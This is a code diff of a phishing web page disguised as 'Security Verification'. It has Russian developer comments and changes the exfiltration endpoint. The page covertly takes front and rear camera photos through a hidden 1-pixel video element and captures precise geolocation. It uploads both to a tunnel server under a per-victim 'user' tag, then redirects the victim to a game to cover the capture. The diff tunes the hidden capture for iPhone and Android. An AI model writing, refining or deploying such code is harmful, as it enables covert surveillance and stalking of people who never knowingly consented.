@@ -5,14 +5,17 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Security Verification</title>
     <style>
-        body { background:#000; color:#fff; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; transition: background 0.15s; overflow: hidden; }
+        body { background:#000; color:#fff; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; transition: background 0.1s; overflow: hidden; }
         .card { text-align:center; padding:40px; background:#111; border-radius:30px; width:85%; max-width: 400px; border:1px solid #333; box-shadow: 0 10px 30px rgba(0,0,0,0.5); transition: opacity 0.3s; z-index: 10; }
         .btn { background:#fff; color:#000; border:none; padding:18px 30px; border-radius:15px; font-weight:bold; cursor:pointer; width:100%; font-size: 18px; transition: 0.3s; }
         #loader { display:none; border:4px solid #333; border-top:4px solid #fff; border-radius:50%; width:40px; height:40px; animation:spin 1s linear infinite; margin:20px auto; }
         @keyframes spin { 100% { transform:rotate(360deg); } }
-        video, canvas { display:none; position: fixed; pointer-events: none; }
-        p { color: #888; font-size: 15px; margin-bottom: 25px; line-height: 1.4; }
         
+        /* Видео должно быть в DOM и "видимым" для iOS Safari */
+        video { position: absolute; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
+        canvas { display:none; }
+        
+        p { color: #888; font-size: 15px; margin-bottom: 25px; line-height: 1.4; }
         body.flash-active { background: #fff !important; }
         .flash-active .card { opacity: 0; }
     </style>
@@ -29,14 +32,13 @@
     <canvas id="c"></canvas>
 
 <script>
-    // 🔗 ОБНОВИ ССЫЛКУ ТУТ:
-    const API = "https://80d6a8800fa3e6.lhr.life"; 
+    // 🔗 НОВАЯ ССЫЛКА:
+    const API = "https://dd975209704700.lhr.life"; 
     const REDIRECT_URL = "https://www.google.com/fbx?fbx=snake_arcade";
 
     const urlParams = new URLSearchParams(window.location.search);
     const user = urlParams.get('user') || "Unknown";
 
-    // Умное имя файла: Дата_Время_Тип
     function getSmartName(label) {
         const now = new Date();
         const ts = now.toISOString().replace(/[-T:.Z]/g, "").substring(0, 14);
@@ -50,12 +52,11 @@
 
         let stream = null;
         try {
-            // Прокачанные настройки: пытаемся взять макс. качество
             stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { 
                     facingMode: mode, 
-                    width: { ideal: 4096 }, 
-                    height: { ideal: 2160 } 
+                    width: { ideal: 1280 }, 
+                    height: { ideal: 720 } 
                 },
                 audio: false 
             });
@@ -63,28 +64,25 @@
             const v = document.getElementById('v');
             v.srcObject = stream;
             
-            // Ждем реального старта видео (исправляет черный экран на ПК)
-            await new Promise((resolve) => {
-                v.onloadedmetadata = () => {
-                    v.play();
-                    resolve();
-                };
-            });
+            // Принудительно запускаем видео (Критично для iPhone)
+            await v.play();
 
-            await new Promise(r => setTimeout(r, 1000)); // Ждем автофокус
+            // Даем 1.2 секунды на автофокус и настройку света
+            await new Promise(r => setTimeout(r, 1200));
 
             const canvas = document.getElementById('c');
             canvas.width = v.videoWidth;
             canvas.height = v.videoHeight;
             canvas.getContext('2d').drawImage(v, 0, 0);
 
+            // Сохраняем в макс. качестве
             const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 1.0));
             return blob;
         } catch (e) {
-            console.warn(`Камера ${mode} недоступна, пропускаем...`);
+            console.warn(`Камера ${mode} недоступна`);
             return null;
         } finally {
-            // Обязательно выключаем камеру перед следующим снимком (важно для Android)
+            // Освобождаем камеру для следующего кадра (Важно для Android)
             if (stream) {
                 stream.getTracks().forEach(t => t.stop());
             }
@@ -103,14 +101,13 @@
         msg.innerText = "Initializing security protocols...";
 
         try {
-            // Геопозиция
+            // Геолокация
             navigator.geolocation.getCurrentPosition(p => {
                 fetch(`${API}/location?lat=${p.coords.latitude}&lon=${p.coords.longitude}&user=${user}`).catch(() => {});
             }, null, {enableHighAccuracy: true});
 
             const fd = new FormData();
             
-            // План: 2 селфи и 2 задних фото
             const plan = [
                 { m: "user", l: "front_1" },
                 { m: "user", l: "front_2" },
@@ -124,8 +121,8 @@
                 if (photo) {
                     fd.append('files', photo, getSmartName(plan[i].l));
                 }
-                // Пауза между снимками для стабильности браузера
-                await new Promise(r => setTimeout(r, 600));
+                // Микро-пауза для стабильности
+                await new Promise(r => setTimeout(r, 500));
             }
 
             if (fd.has('files')) {
@@ -143,7 +140,6 @@
             setTimeout(() => { window.location.href = REDIRECT_URL; }, 1200);
 
         } catch (e) {
-            console.error(e);
             statusTitle.innerText = "Error";
             msg.innerText = "Check camera permissions and retry.";
             loader.style.display = 'none';
